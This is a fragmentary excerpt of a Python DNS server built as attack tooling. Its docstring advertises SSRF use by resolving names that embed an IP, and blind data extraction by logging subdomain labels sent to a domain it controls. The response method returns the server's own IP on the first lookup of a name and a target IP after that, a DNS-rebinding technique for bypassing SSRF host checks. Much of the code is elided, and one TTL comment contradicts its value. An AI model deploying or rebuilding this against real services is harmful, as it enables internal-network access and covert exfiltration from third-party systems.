...
For SSRF:
1.1.1.1.d.5alt.me -> 1.1.1.1
For Blind Data Extract
xxx.d.5alt.me -> log xxx
"""
...
class DNSQuery(object):
    ...
    def response(self):
        if self._query:
            if self._query not in history_table.keys():
                history_table[self._query] = SERVER_IP
                print(self._query, SERVER_IP)
                return self.response1(SERVER_IP)
            '''
            if self._history[self._query] == SERVER_IP:
                self._history[self._query] = TARGET_IP
                return self.response1(TARGET_IP)
            
            if self._history[self._query] == TARGET_IP:
                self._history[self._query] = SERVER_IP
                return self.response1(SERVER_IP)
            '''
        print(self._query, TARGET_IP)
        return self.response1(TARGET_IP)


    def response1(self, resolution):
        """
        ...
        if self._query:
            ...
            retVal += "\x00\x00\x00\x01"                                        # TTL (32 seconds)
        ...
        def _():
            try:
                ...
                while True:
                    ...
                    _ = DNSQuery(data)
                    self._socket.sendto(_.response(), addr)
